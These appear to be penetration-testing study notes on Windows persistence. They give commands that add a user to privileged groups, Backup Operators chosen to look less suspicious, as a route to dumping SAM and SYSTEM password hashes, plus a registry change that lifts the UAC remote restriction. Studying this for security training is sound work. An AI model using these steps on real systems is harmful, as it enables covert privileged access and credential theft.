Assign Group Memberships
------------------------
Note: you need access with an account with administrator privileges to do the following commands.

C:\> net localgroup administrators <username> /add
- add an unprivileged user to the administrators group in order to give them administrative privileges

C:\> net localgroup "Backup Operators" <username> /add
- adding a user to this group, instead of Administrators may look less suspicious
- "Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially."
Note: even though the user has now been added to the Backup Operators group, if they log-in remotely (e.g. through WinRM) they will still not be able to access all files. This is because the group is not enabled. A `whoami /groups` search would show:
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
The cause is UAC (User Access Control). It prevents local accounts from having ANY admin privileges when they are logging in remotely. This is called "LocalAccountTokenFilterPolicy". When using a GUI remote interface the option exists to them elevate privileges through the UAC. This opion doesn ot exist for a command line interface such as WinRM. In order to allow the user in the Backup Operators group to have all its prvileges when logging in remotely, change the the below registry key to 1 by giving the following command:
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
Now a `whoami /groups` search should show:
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group



C:\> net localgroup "Remote Management Users" <username> /add
- add user to Remote Management Users (WinRM) group
- allows user to log in remotely to this machine using WinRM

C:\> net localgroup "Remote Desktop Users" <username> /add
- add user to Remote Desktop Users (RDP) group
- allows user to log in remotely to this machine using RDP
